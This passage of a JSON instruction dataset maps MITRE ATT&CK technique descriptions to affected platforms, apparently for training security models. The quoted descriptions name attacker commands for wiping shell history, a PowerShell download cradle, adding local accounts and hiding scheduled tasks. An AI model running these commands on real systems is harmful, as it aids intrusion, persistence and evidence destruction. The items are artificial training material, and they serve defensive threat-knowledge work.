      "answer": "The provided description is related to MITRE technique Software Discovery: Security Software Discovery (T1518.001);\nTechnique Software Discovery: Security Software Discovery (T1518.001) is applicable to platforms: Linux,  Windows,  macOS, IaaS;\nTherefore, the given procedure description is related to platforms: Linux,  Windows,  macOS, IaaS.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system. Adversaries may use the information from File and Directory Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nMany command shell utilities can be used to obtain this information. Examples include <code>dir</code>, <code>tree</code>, <code>ls</code>, <code>find</code>, and <code>locate</code>. Custom tools may also be used to gather file and directory information and interact with the Native API. Adversaries may also leverage a Network Device CLI on network devices to gather file and directory information (e.g. <code>dir</code>, <code>show flash</code>, and/or <code>nvram</code>).\n\nSome files and directories may require elevated or specific user permissions to access.",
    "context": "",
    "output": "The provided description is related to MITRE technique File and Directory Discovery (T1083);\nTechnique File and Directory Discovery (T1083) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system. Adversaries may use the information from File and Directory Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nMany command shell utilities can be used to obtain this information. Examples include <code>dir</code>, <code>tree</code>, <code>ls</code>, <code>find</code>, and <code>locate</code>. Custom tools may also be used to gather file and directory information and interact with the Native API. Adversaries may also leverage a Network Device CLI on network devices to gather file and directory information (e.g. <code>dir</code>, <code>show flash</code>, and/or <code>nvram</code>).\n\nSome files and directories may require elevated or specific user permissions to access.",
      "answer": "The provided description is related to MITRE technique File and Directory Discovery (T1083);\nTechnique File and Directory Discovery (T1083) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may communicate using application layer protocols associated with transferring files to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \n\nProtocols such as SMB, FTP, FTPS, and TFTP that transfer files may be very common in environments.  Packets produced from these protocols may have many fields and headers in which data can be concealed. Data could also be concealed within the transferred files. An adversary may abuse these protocols to communicate with systems under their control within a victim network while also mimicking normal, expected traffic.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Application Layer Protocol: File Transfer Protocols (T1071.002);\nTechnique Application Layer Protocol: File Transfer Protocols (T1071.002) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may communicate using application layer protocols associated with transferring files to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \n\nProtocols such as SMB, FTP, FTPS, and TFTP that transfer files may be very common in environments.  Packets produced from these protocols may have many fields and headers in which data can be concealed. Data could also be concealed within the transferred files. An adversary may abuse these protocols to communicate with systems under their control within a victim network while also mimicking normal, expected traffic.",
      "answer": "The provided description is related to MITRE technique Application Layer Protocol: File Transfer Protocols (T1071.002);\nTechnique Application Layer Protocol: File Transfer Protocols (T1071.002) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may communicate using application layer protocols associated with web traffic to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \n\nProtocols such as HTTP/S and WebSocket that carry web traffic may be very common in environments. HTTP/S packets have many fields and headers in which data can be concealed. An adversary may abuse these protocols to communicate with systems under their control within a victim network while also mimicking normal, expected traffic.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Application Layer Protocol: Web Protocols (T1071.001);\nTechnique Application Layer Protocol: Web Protocols (T1071.001) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may communicate using application layer protocols associated with web traffic to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \n\nProtocols such as HTTP/S and WebSocket that carry web traffic may be very common in environments. HTTP/S packets have many fields and headers in which data can be concealed. An adversary may abuse these protocols to communicate with systems under their control within a victim network while also mimicking normal, expected traffic.",
      "answer": "The provided description is related to MITRE technique Application Layer Protocol: Web Protocols (T1071.001);\nTechnique Application Layer Protocol: Web Protocols (T1071.001) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: In addition to clearing system logs, an adversary may clear the command history of a compromised account to conceal the actions undertaken during an intrusion. Various command interpreters keep track of the commands users type in their terminal so that users can retrace what they've done.\n\nOn Linux and macOS, these command histories can be accessed in a few different ways. While logged in, this command history is tracked in a file pointed to by the environment variable <code>HISTFILE</code>. When a user logs off a system, this information is flushed to a file in the user's home directory called <code>~/.bash_history</code>. The benefit of this is that it allows users to go back to commands they've used before in different sessions.\n\nAdversaries may delete their commands from these logs by manually clearing the history (<code>history -c</code>) or deleting the bash history file <code>rm ~/.bash_history</code>.  \n\nAdversaries may also leverage a Network Device CLI on network devices to clear command history data (<code>clear logging</code> and/or <code>clear history</code>).\n\nOn Windows hosts, PowerShell has two different command history providers: the built-in history and the command history managed by the <code>PSReadLine</code> module. The built-in history only tracks the commands used in the current session. This command history is not available to other sessions and is deleted when the session ends.\n\nThe <code>PSReadLine</code> command history tracks the commands used in all PowerShell sessions and writes them to a file (<code>$env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt</code> by default). This history file is available to all sessions and contains all past history since the file is not deleted when the session ends.\n\nAdversaries may run the PowerShell command <code>Clear-History</code> to flush the entire command history from a current PowerShell session. This, however, will not delete/flush the <code>ConsoleHost_history.txt</code> file. Adversaries may also delete the <code>ConsoleHost_history.txt</code> file or edit its contents to hide PowerShell commands they have run.",
    "context": "",
    "output": "The provided description is related to MITRE technique Indicator Removal: Clear Command History (T1070.003);\nTechnique Indicator Removal: Clear Command History (T1070.003) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: In addition to clearing system logs, an adversary may clear the command history of a compromised account to conceal the actions undertaken during an intrusion. Various command interpreters keep track of the commands users type in their terminal so that users can retrace what they've done.\n\nOn Linux and macOS, these command histories can be accessed in a few different ways. While logged in, this command history is tracked in a file pointed to by the environment variable <code>HISTFILE</code>. When a user logs off a system, this information is flushed to a file in the user's home directory called <code>~/.bash_history</code>. The benefit of this is that it allows users to go back to commands they've used before in different sessions.\n\nAdversaries may delete their commands from these logs by manually clearing the history (<code>history -c</code>) or deleting the bash history file <code>rm ~/.bash_history</code>.  \n\nAdversaries may also leverage a Network Device CLI on network devices to clear command history data (<code>clear logging</code> and/or <code>clear history</code>).\n\nOn Windows hosts, PowerShell has two different command history providers: the built-in history and the command history managed by the <code>PSReadLine</code> module. The built-in history only tracks the commands used in the current session. This command history is not available to other sessions and is deleted when the session ends.\n\nThe <code>PSReadLine</code> command history tracks the commands used in all PowerShell sessions and writes them to a file (<code>$env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt</code> by default). This history file is available to all sessions and contains all past history since the file is not deleted when the session ends.\n\nAdversaries may run the PowerShell command <code>Clear-History</code> to flush the entire command history from a current PowerShell session. This, however, will not delete/flush the <code>ConsoleHost_history.txt</code> file. Adversaries may also delete the <code>ConsoleHost_history.txt</code> file or edit its contents to hide PowerShell commands they have run.",
      "answer": "The provided description is related to MITRE technique Indicator Removal: Clear Command History (T1070.003);\nTechnique Indicator Removal: Clear Command History (T1070.003) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may create a local account to maintain access to victim systems. Local accounts are those configured by an organization for use by users, remote support, services, or for administration on a single system or service. \n\nFor example, with a sufficient level of access, the Windows <code>net user /add</code> command can be used to create a local account. On macOS systems the <code>dscl -create</code> command can be used to create a local account. Local accounts may also be added to network devices, often via common Network Device CLI commands such as <code>username</code>, or to Kubernetes clusters using the `kubectl` utility.\n\nSuch accounts may be used to establish secondary credentialed access that do not require persistent remote access tools to be deployed on the system.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Create Account: Local Account (T1136.001);\nTechnique Create Account: Local Account (T1136.001) is applicable to platforms: Linux,  Network,  Windows,  macOS, Containers;\nTherefore, the given procedure description is related to platforms: Linux,  Network,  Windows,  macOS, Containers.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may create a local account to maintain access to victim systems. Local accounts are those configured by an organization for use by users, remote support, services, or for administration on a single system or service. \n\nFor example, with a sufficient level of access, the Windows <code>net user /add</code> command can be used to create a local account. On macOS systems the <code>dscl -create</code> command can be used to create a local account. Local accounts may also be added to network devices, often via common Network Device CLI commands such as <code>username</code>, or to Kubernetes clusters using the `kubectl` utility.\n\nSuch accounts may be used to establish secondary credentialed access that do not require persistent remote access tools to be deployed on the system.",
      "answer": "The provided description is related to MITRE technique Create Account: Local Account (T1136.001);\nTechnique Create Account: Local Account (T1136.001) is applicable to platforms: Linux,  Network,  Windows,  macOS, Containers;\nTherefore, the given procedure description is related to platforms: Linux,  Network,  Windows,  macOS, Containers.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may abuse the Windows Task Scheduler to perform task scheduling for initial or recurring execution of malicious code. There are multiple ways to access the Task Scheduler in Windows. The schtasks utility can be run directly on the command line, or the Task Scheduler can be opened through the GUI within the Administrator Tools section of the Control Panel. In some cases, adversaries have used a .NET wrapper for the Windows Task Scheduler, and alternatively, adversaries have used the Windows netapi32 library to create a scheduled task.\n\nThe deprecated at utility could also be abused by adversaries (ex: At), though <code>at.exe</code> can not access tasks created with <code>schtasks</code> or the Control Panel.\n\nAn adversary may use Windows Task Scheduler to execute programs at system startup or on a scheduled basis for persistence. The Windows Task Scheduler can also be abused to conduct remote Execution as part of Lateral Movement and/or to run a process under the context of a specified account (such as SYSTEM). Similar to System Binary Proxy Execution, adversaries have also abused the Windows Task Scheduler to potentially mask one-time execution under signed/trusted system processes.\n\nAdversaries may also create \"hidden\" scheduled tasks (i.e. Hide Artifacts) that may not be visible to defender tools and manual queries used to enumerate tasks. Specifically, an adversary may hide a task from `schtasks /query` and the Task Scheduler by deleting the associated Security Descriptor (SD) registry value (where deletion of this value must be completed using SYSTEM permissions). Adversaries may also employ alternate methods to hide tasks, such as altering the metadata (e.g., `Index` value) within associated registry keys.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Scheduled Task/Job: Scheduled Task (T1053.005);\nTechnique Scheduled Task/Job: Scheduled Task (T1053.005) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may abuse the Windows Task Scheduler to perform task scheduling for initial or recurring execution of malicious code. There are multiple ways to access the Task Scheduler in Windows. The schtasks utility can be run directly on the command line, or the Task Scheduler can be opened through the GUI within the Administrator Tools section of the Control Panel. In some cases, adversaries have used a .NET wrapper for the Windows Task Scheduler, and alternatively, adversaries have used the Windows netapi32 library to create a scheduled task.\n\nThe deprecated at utility could also be abused by adversaries (ex: At), though <code>at.exe</code> can not access tasks created with <code>schtasks</code> or the Control Panel.\n\nAn adversary may use Windows Task Scheduler to execute programs at system startup or on a scheduled basis for persistence. The Windows Task Scheduler can also be abused to conduct remote Execution as part of Lateral Movement and/or to run a process under the context of a specified account (such as SYSTEM). Similar to System Binary Proxy Execution, adversaries have also abused the Windows Task Scheduler to potentially mask one-time execution under signed/trusted system processes.\n\nAdversaries may also create \"hidden\" scheduled tasks (i.e. Hide Artifacts) that may not be visible to defender tools and manual queries used to enumerate tasks. Specifically, an adversary may hide a task from `schtasks /query` and the Task Scheduler by deleting the associated Security Descriptor (SD) registry value (where deletion of this value must be completed using SYSTEM permissions). Adversaries may also employ alternate methods to hide tasks, such as altering the metadata (e.g., `Index` value) within associated registry keys.",
      "answer": "The provided description is related to MITRE technique Scheduled Task/Job: Scheduled Task (T1053.005);\nTechnique Scheduled Task/Job: Scheduled Task (T1053.005) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may exfiltrate data, such as sensitive documents, through the use of automated processing after being gathered during Collection. \n\nWhen automated exfiltration is used, other exfiltration techniques likely apply as well to transfer the information out of the network, such as Exfiltration Over C2 Channel and Exfiltration Over Alternative Protocol.",
    "context": "",
    "output": "The provided description is related to MITRE technique Automated Exfiltration (T1020);\nTechnique Automated Exfiltration (T1020) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may exfiltrate data, such as sensitive documents, through the use of automated processing after being gathered during Collection. \n\nWhen automated exfiltration is used, other exfiltration techniques likely apply as well to transfer the information out of the network, such as Exfiltration Over C2 Channel and Exfiltration Over Alternative Protocol.",
      "answer": "The provided description is related to MITRE technique Automated Exfiltration (T1020);\nTechnique Automated Exfiltration (T1020) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may transfer tools or other files from an external system into a compromised environment. Tools or files may be copied from an external adversary-controlled system to the victim network through the command and control channel or through alternate protocols such as ftp. Once present, adversaries may also transfer/spread tools between victim devices within a compromised environment (i.e. Lateral Tool Transfer). \n\nOn Windows, adversaries may use various utilities to download tools, such as `copy`, `finger`, certutil, and PowerShell commands such as <code>IEX(New-Object Net.WebClient).downloadString()</code> and <code>Invoke-WebRequest</code>. On Linux and macOS systems, a variety of utilities also exist, such as `curl`, `scp`, `sftp`, `tftp`, `rsync`, `finger`, and `wget`.\n\nAdversaries may also abuse installers and package managers, such as `yum` or `winget`, to download tools to victim hosts. Adversaries have also abused file application features, such as the Windows `search-ms` protocol handler, to deliver malicious files to victims through remote file searches invoked by User Execution (typically after interacting with Phishing lures).\n\nFiles can also be transferred using various Web Services as well as native or otherwise present tools on the victim system. In some cases, adversaries may be able to leverage services that sync between a web-based and an on-premises client, such as Dropbox or OneDrive, to transfer files onto victim systems. For example, by compromising a cloud account and logging into the service's web portal, an adversary may be able to trigger an automatic syncing process that transfers the file onto the victim's machine.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Ingress Tool Transfer (T1105);\nTechnique Ingress Tool Transfer (T1105) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may transfer tools or other files from an external system into a compromised environment. Tools or files may be copied from an external adversary-controlled system to the victim network through the command and control channel or through alternate protocols such as ftp. Once present, adversaries may also transfer/spread tools between victim devices within a compromised environment (i.e. Lateral Tool Transfer). \n\nOn Windows, adversaries may use various utilities to download tools, such as `copy`, `finger`, certutil, and PowerShell commands such as <code>IEX(New-Object Net.WebClient).downloadString()</code> and <code>Invoke-WebRequest</code>. On Linux and macOS systems, a variety of utilities also exist, such as `curl`, `scp`, `sftp`, `tftp`, `rsync`, `finger`, and `wget`.\n\nAdversaries may also abuse installers and package managers, such as `yum` or `winget`, to download tools to victim hosts. Adversaries have also abused file application features, such as the Windows `search-ms` protocol handler, to deliver malicious files to victims through remote file searches invoked by User Execution (typically after interacting with Phishing lures).\n\nFiles can also be transferred using various Web Services as well as native or otherwise present tools on the victim system. In some cases, adversaries may be able to leverage services that sync between a web-based and an on-premises client, such as Dropbox or OneDrive, to transfer files onto victim systems. For example, by compromising a cloud account and logging into the service's web portal, an adversary may be able to trigger an automatic syncing process that transfers the file onto the victim's machine.",
      "answer": "The provided description is related to MITRE technique Ingress Tool Transfer (T1105);\nTechnique Ingress Tool Transfer (T1105) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may leverage external-facing remote services to initially access and/or persist within a network. Remote services such as VPNs, Citrix, and other access mechanisms allow users to connect to internal enterprise network resources from external locations. There are often remote service gateways that manage connections and credential authentication for these services. Services such as Windows Remote Management and VNC can also be used externally.\n\nAccess to Valid Accounts to use the service is often a requirement, which could be obtained through credential pharming or by obtaining the credentials from users after compromising the enterprise network. Access to remote services may be used as a redundant or persistent access mechanism during an operation.\n\nAccess may also be gained through an exposed service that doesn\u2019t require authentication. In containerized environments, this may include an exposed Docker API, Kubernetes API server, kubelet, or web application such as the Kubernetes dashboard.",
    "context": "",
    "output": "The provided description is related to MITRE technique External Remote Services (T1133);\nTechnique External Remote Services (T1133) is applicable to platforms: Linux,  Windows,  macOS, Containers;\nTherefore, the given procedure description is related to platforms: Linux,  Windows,  macOS, Containers.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may leverage external-facing remote services to initially access and/or persist within a network. Remote services such as VPNs, Citrix, and other access mechanisms allow users to connect to internal enterprise network resources from external locations. There are often remote service gateways that manage connections and credential authentication for these services. Services such as Windows Remote Management and VNC can also be used externally.\n\nAccess to Valid Accounts to use the service is often a requirement, which could be obtained through credential pharming or by obtaining the credentials from users after compromising the enterprise network. Access to remote services may be used as a redundant or persistent access mechanism during an operation.\n\nAccess may also be gained through an exposed service that doesn\u2019t require authentication. In containerized environments, this may include an exposed Docker API, Kubernetes API server, kubelet, or web application such as the Kubernetes dashboard.",
      "answer": "The provided description is related to MITRE technique External Remote Services (T1133);\nTechnique External Remote Services (T1133) is applicable to platforms: Linux,  Windows,  macOS, Containers;\nTherefore, the given procedure description is related to platforms: Linux,  Windows,  macOS, Containers.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may search for private key certificate files on compromised systems for insecurely stored credentials. Private cryptographic keys and certificates are used for authentication, encryption/decryption, and digital signatures. Common key and certificate file extensions include: .key, .pgp, .gpg, .ppk., .p12, .pem, .pfx, .cer, .p7b, .asc. \n\nAdversaries may also look in common key directories, such as <code>~/.ssh</code> for SSH keys on * nix-based systems or <code>C:&#92;Users&#92;(username)&#92;.ssh&#92;</code> on Windows. Adversary tools may also search compromised systems for file extensions relating to cryptographic keys and certificates.\n\nWhen a device is registered to Azure AD, a device key and a transport key are generated and used to verify the device\u2019s identity. An adversary with access to the device may be able to export the keys in order to impersonate the device.\n\nOn network devices, private keys may be exported via Network Device CLI commands such as `crypto pki export`. \n\nSome private keys require a password or passphrase for operation, so an adversary may also use Input Capture for keylogging or attempt to Brute Force the passphrase off-line. These private keys can be used to authenticate to Remote Services like SSH or for use in decrypting other collected files such as email.",
    "context": "",
    "output": "The provided description is related to MITRE technique Unsecured Credentials: Private Keys (T1552.004);\nTechnique Unsecured Credentials: Private Keys (T1552.004) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may search for private key certificate files on compromised systems for insecurely stored credentials. Private cryptographic keys and certificates are used for authentication, encryption/decryption, and digital signatures. Common key and certificate file extensions include: .key, .pgp, .gpg, .ppk., .p12, .pem, .pfx, .cer, .p7b, .asc. \n\nAdversaries may also look in common key directories, such as <code>~/.ssh</code> for SSH keys on * nix-based systems or <code>C:&#92;Users&#92;(username)&#92;.ssh&#92;</code> on Windows. Adversary tools may also search compromised systems for file extensions relating to cryptographic keys and certificates.\n\nWhen a device is registered to Azure AD, a device key and a transport key are generated and used to verify the device\u2019s identity. An adversary with access to the device may be able to export the keys in order to impersonate the device.\n\nOn network devices, private keys may be exported via Network Device CLI commands such as `crypto pki export`. \n\nSome private keys require a password or passphrase for operation, so an adversary may also use Input Capture for keylogging or attempt to Brute Force the passphrase off-line. These private keys can be used to authenticate to Remote Services like SSH or for use in decrypting other collected files such as email.",
      "answer": "The provided description is related to MITRE technique Unsecured Credentials: Private Keys (T1552.004);\nTechnique Unsecured Credentials: Private Keys (T1552.004) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may attempt to get a listing of other systems by IP address, hostname, or other logical identifier on a network that may be used for Lateral Movement from the current system. Functionality could exist within remote access tools to enable this, but utilities available on the operating system could also be used such as  Ping or <code>net view</code> using Net.\n\nAdversaries may also analyze data from local host files (ex: <code>C:\\Windows\\System32\\Drivers\\etc\\hosts</code> or <code>/etc/hosts</code>) or other passive means (such as local Arp cache entries) in order to discover the presence of remote systems in an environment.\n\nAdversaries may also target discovery of network infrastructure as well as leverage Network Device CLI commands on network devices to gather detailed information about systems within a network (e.g. <code>show cdp neighbors</code>, <code>show arp</code>).",
    "context": "",
    "output": "The provided description is related to MITRE technique Remote System Discovery (T1018);\nTechnique Remote System Discovery (T1018) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may attempt to get a listing of other systems by IP address, hostname, or other logical identifier on a network that may be used for Lateral Movement from the current system. Functionality could exist within remote access tools to enable this, but utilities available on the operating system could also be used such as  Ping or <code>net view</code> using Net.\n\nAdversaries may also analyze data from local host files (ex: <code>C:\\Windows\\System32\\Drivers\\etc\\hosts</code> or <code>/etc/hosts</code>) or other passive means (such as local Arp cache entries) in order to discover the presence of remote systems in an environment.\n\nAdversaries may also target discovery of network infrastructure as well as leverage Network Device CLI commands on network devices to gather detailed information about systems within a network (e.g. <code>show cdp neighbors</code>, <code>show arp</code>).",
      "answer": "The provided description is related to MITRE technique Remote System Discovery (T1018);\nTechnique Remote System Discovery (T1018) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may abuse the Windows command shell for execution. The Windows command shell (cmd) is the primary command prompt on Windows systems. The Windows command prompt can be used to control almost any aspect of a system, with various permission levels required for different subsets of commands. The command prompt can be invoked remotely via Remote Services such as SSH.\n\nBatch files (ex: .bat or .cmd) also provide the shell with a list of sequential commands to run, as well as normal scripting operations such as conditionals and loops. Common uses of batch files include long or repetitive tasks, or the need to run the same set of commands on multiple systems.\n\nAdversaries may leverage cmd to execute various commands and payloads. Common uses include cmd to execute a single command, or abusing cmd interactively with input and output forwarded over a command and control channel.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Command and Scripting Interpreter: Windows Command Shell (T1059.003);\nTechnique Command and Scripting Interpreter: Windows Command Shell (T1059.003) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may abuse the Windows command shell for execution. The Windows command shell (cmd) is the primary command prompt on Windows systems. The Windows command prompt can be used to control almost any aspect of a system, with various permission levels required for different subsets of commands. The command prompt can be invoked remotely via Remote Services such as SSH.\n\nBatch files (ex: .bat or .cmd) also provide the shell with a list of sequential commands to run, as well as normal scripting operations such as conditionals and loops. Common uses of batch files include long or repetitive tasks, or the need to run the same set of commands on multiple systems.\n\nAdversaries may leverage cmd to execute various commands and payloads. Common uses include cmd to execute a single command, or abusing cmd interactively with input and output forwarded over a command and control channel.",
      "answer": "The provided description is related to MITRE technique Command and Scripting Interpreter: Windows Command Shell (T1059.003);\nTechnique Command and Scripting Interpreter: Windows Command Shell (T1059.003) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may encode data with a standard data encoding system to make the content of command and control traffic more difficult to detect. Command and control (C2) information can be encoded using a standard data encoding system that adheres to existing protocol specifications. Common data encoding schemes include ASCII, Unicode, hexadecimal, Base64, and MIME. Some data encoding systems may also result in data compression, such as gzip.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Data Encoding: Standard Encoding (T1132.001);\nTechnique Data Encoding: Standard Encoding (T1132.001) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may encode data with a standard data encoding system to make the content of command and control traffic more difficult to detect. Command and control (C2) information can be encoded using a standard data encoding system that adheres to existing protocol specifications. Common data encoding schemes include ASCII, Unicode, hexadecimal, Base64, and MIME. Some data encoding systems may also result in data compression, such as gzip.",
      "answer": "The provided description is related to MITRE technique Data Encoding: Standard Encoding (T1132.001);\nTechnique Data Encoding: Standard Encoding (T1132.001) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may transfer tools or other files from an external system into a compromised environment. Tools or files may be copied from an external adversary-controlled system to the victim network through the command and control channel or through alternate protocols such as ftp. Once present, adversaries may also transfer/spread tools between victim devices within a compromised environment (i.e. Lateral Tool Transfer). \n\nOn Windows, adversaries may use various utilities to download tools, such as `copy`, `finger`, certutil, and PowerShell commands such as <code>IEX(New-Object Net.WebClient).downloadString()</code> and <code>Invoke-WebRequest</code>. On Linux and macOS systems, a variety of utilities also exist, such as `curl`, `scp`, `sftp`, `tftp`, `rsync`, `finger`, and `wget`.\n\nAdversaries may also abuse installers and package managers, such as `yum` or `winget`, to download tools to victim hosts. Adversaries have also abused file application features, such as the Windows `search-ms` protocol handler, to deliver malicious files to victims through remote file searches invoked by User Execution (typically after interacting with Phishing lures).\n\nFiles can also be transferred using various Web Services as well as native or otherwise present tools on the victim system. In some cases, adversaries may be able to leverage services that sync between a web-based and an on-premises client, such as Dropbox or OneDrive, to transfer files onto victim systems. For example, by compromising a cloud account and logging into the service's web portal, an adversary may be able to trigger an automatic syncing process that transfers the file onto the victim's machine.",
    "context": "",
